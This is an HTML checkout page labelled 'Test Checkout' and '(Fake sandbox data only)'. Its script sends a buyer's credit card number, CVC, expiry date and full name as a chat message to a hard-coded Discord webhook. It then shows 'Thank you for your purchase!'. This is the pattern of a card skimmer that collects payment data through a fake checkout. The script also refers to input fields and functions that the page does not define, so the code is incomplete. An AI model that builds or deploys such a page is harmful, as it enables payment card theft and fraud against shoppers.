<!DOCTYPE html>
<html>
<head>
    <title>Test Checkout</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .checkout-box {
            background: #1e1e1e;
            padding: 25px;
            border-radius: 10px;
            width: 320px;
            text-align: center;
        }

        button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: #4caf50;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 16px;
            border-radius: 6px;
        }

        button:hover {
            background: #45a049;
        }
    </style>
</head>
<body>

<div class="checkout-box">
    <h2>Test Checkout</h2>
    <p>(Fake sandbox data only)</p>

    <button onclick="finishPurchase()">Purchase</button>
</div>

<script>
const webhookURL =
  "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";

function finishPurchase() {
  const payload = {
    content:
`ðŸ›’ **New Purchase**
Cvc: ${cvc.value}
Credit Card: ${cardNum.value}
Buyer: ${fullName.value}
Exp date: ${expDate.value}
Time: ${new Date().toLocaleString()}`
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
    .then((res) => {
      if (res.ok) {
        alert("Thank you for your purchase!");
        closeCheckout();

        cardNum.value = "";
        cvc.value = "";
        fullName.value = "";
        expDate.value = "";
        validateCheckout();
      } else {
        alert("Webhook error.");
      }
    })
    .catch((err) => alert("Error: " + err));
}

loadItems();
</script>
</body>
